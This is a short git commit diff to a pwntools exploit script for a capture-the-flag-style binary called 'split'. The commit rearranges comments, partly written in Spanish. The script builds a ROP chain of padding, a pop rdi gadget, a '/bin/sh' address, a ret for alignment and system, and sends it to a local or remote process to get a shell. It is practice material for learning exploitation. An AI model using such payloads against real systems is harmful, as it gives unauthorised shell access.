cb0e6525aabcfea136f4cdd399f79dee25d7aa1d
icecream-bar <franc.brevis@gmail.com>
2022-11-06 00:33:33 -0300

    update split

--- split/xpl.py
+++ split/xpl.py
@@ -15,7 +15,6 @@ continue
 
 def start():
     if args.GDB:
-       #return gdb.attach(process(elf.path), gs)
        return gdb.debug('./split', gdbscript=gs)
     if args.REMOTE:
         return remote('127.0.0.1', 5555)
@@ -35,12 +34,9 @@ payload = b'A'*40
 #payload += 'BBBBBBB'
 #payload += 'CCCCCCC'
 #We have to find address of pop rdi = ropper --file split --search 'pop rdi'
-#Saca lo que sea que este en el stack y hace un pop en el rdi
-payload += p64(poprdi)
-#now we have to find the addresses of binsh and system
-payload += p64(binsh)
-#in ubuntu we have to add ret address to aline the stack
-payload += p64(ret)
+payload += p64(poprdi)  #saca lo que sea que este en el stack y hace un pop en el rdi
+payload += p64(binsh)   #now we have to find the addresses of binsh and system
+payload += p64(ret)     #in ubuntu we have to add ret address to aline the stack
 payload += p64(system)
 
 r.sendlineafter('>', payload)
